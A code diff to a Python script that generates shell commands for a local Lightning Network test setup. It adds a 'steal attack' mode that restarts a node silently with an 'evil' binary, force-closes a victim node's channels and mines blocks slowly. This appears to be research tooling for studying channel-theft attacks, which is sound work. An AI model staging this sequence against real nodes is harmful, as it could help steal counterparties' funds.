@@ -255,6 +255,40 @@ class CommandsGenerator:
     done
         """)
     
+    def stop_lightning_node(self, node_idx: int):
+        self.__write_line(f"lcli {node_idx} stop")
+    
+    def start_lightning_node_silent(self, node_idx: int):
+        self.start_lightning_node(
+            idx=node_idx,
+            lightning_dir=self.__get_node_lightning_dir(node_idx),
+            binary=LIGHTNING_BINARY_EVIL,
+            port=self.__get_node_lightning_port(node_idx),
+            silent=True,
+        )
+    
+    def close_all_node_channels(self, node_idx):
+        pass;
+        self.__write_line(
+            f"""PEER_IDS=$(lcli {node_idx} listpeers | jq -r ".peers[] | .id")"""
+        )
+        self.__write_line(f"""
+    for id in $PEER_IDS; do
+        lcli {node_idx} close $id
+    done
+        """)
+    
+    def mine_many(self, num_blocks: int, block_time_sec: int = 60):
+        """
+        generate code to mine num_blocks blocks every block_time_sec seconds
+        """
+        self.__write_line(f"""
+    for i in $(seq 1 {num_blocks}); do
+        mine 1; sleep {block_time_sec};
+    done
+        """)
+        # we have a redundant sleep at the end. Nu shoin... I rather keep it simple than efficient
+    
     def mine(self, num_blocks):
         self.__write_line(f"mine {num_blocks}")
     
@@ -279,6 +313,10 @@ def parse_args():
     parser.add_argument(
         "--make-payments", type=int, nargs=4, metavar=("SENDER_ID", "RECEIVER_ID", "NUM_PAYMENTS", "AMOUNT_MSAT"),
         help="generate code to make payments between two nodes",
+    )
+    parser.add_argument(
+        "--steal-attack", type=int, nargs=3, metavar=("SENDER_ID", "RECEIVER_ID", "NUM_BLOCKS"),
+        help="generate code to execute the steal attack. NUM_BLOCKS are mined",
     )
     parser.add_argument(
         "--outfile", action="store", metavar="OUTFILE",
@@ -325,6 +363,17 @@ def main() -> None:
         cg.wait_to_route(sender_idx, receiver_idx, amount_msat)
         cg.info("making payments")
         cg.make_payments(*args.make_payments)
+    
+    if args.steal_attack:
+        sender_idx, receiver_idx, num_blocks = args.steal_attack
+        cg.info(f"stopping lightning node {sender_idx}")
+        cg.stop_lightning_node(sender_idx)
+        cg.info(f"starting lightning node {sender_idx} in silent mode")
+        cg.start_lightning_node_silent(sender_idx)
+        cg.info(f"closing all channels of node {receiver_idx}")
+        cg.close_all_node_channels(receiver_idx)
+        cg.info(f"slowly mining {num_blocks} blocks")
+        cg.mine_many(num_blocks)
     
     # NOTE: we close outfile which may be stdout
     outfile.close()
